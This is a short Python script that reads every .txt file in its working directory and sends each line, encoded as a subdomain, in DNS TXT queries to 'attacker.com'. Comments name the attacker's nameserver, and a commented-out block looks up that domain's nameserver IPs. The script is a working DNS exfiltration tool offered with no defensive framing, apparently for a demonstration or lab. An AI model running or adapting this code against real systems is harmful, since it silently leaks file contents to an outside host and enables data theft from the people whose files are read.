import dns.resolver
import os

# The domain to append to each line
target_domain = "attacker.com"

'''
# The attacker's nameserver IP address
ns_records = dns.resolver.resolve(target_domain, "NS")

authoritative_ns_ips = []

for ns in ns_records:
    ns_hostname = str(ns.target)
    # Resolve each nameserver hostname to its IP address
    a_records = dns.resolver.resolve(ns_hostname, "A")
    for record in a_records:
        authoritative_ns_ips.append(str(record))
        print(f"Nameserver: {ns_hostname} -> IP: {record}")

# Store the first authoritative nameserver IP in a variable
nameserver_ip = authoritative_ns_ips[0] if authoritative_ns_ips else None

print(f"\nPrimary authoritative nameserver IP: {nameserver_ip}")
'''
try:
    # Set the resolver to use the attacker's nameserver
    resolver = dns.resolver.Resolver()
    #resolver.nameservers = [nameserver_ip]
    #print(f"Sending DNS queries to {nameserver_ip} for subdomains of {target_domain}...\n")

    # Iterate over all .txt files in the current directory
    for filename in os.listdir('.'):
        if filename.endswith('.txt'):
            print(f"\nProcessing file: {filename}\n")
            with open(filename, 'r') as file:
                for line in file:
                    # Clean up the line (remove whitespace and newline characters)
                    subdomain_prefix = line.strip()
                    if subdomain_prefix:
                        # Replace spaces with underscores
                        subdomain_prefix = subdomain_prefix.replace(' ', '_')
                        full_query = f"{subdomain_prefix}.{target_domain}"
                        try:
                            # Perform the DNS query for an A record
                            answers = resolver.resolve(full_query, 'TXT')
                            # Print the resolved IP address(es)
                            for rdata in answers:
                                print(f"Query for {full_query}: {rdata.to_text()}")
                        except dns.resolver.NoAnswer:
                            print(f"No TXT record found for {full_query}")
                        except dns.resolver.NXDOMAIN:
                            print(f"Domain does not exist: {full_query}")
                        except Exception as e:
                            print(f"An error occurred while querying {full_query}: {e}")
except Exception as e:
    print(f"An unexpected error occurred: {e}")

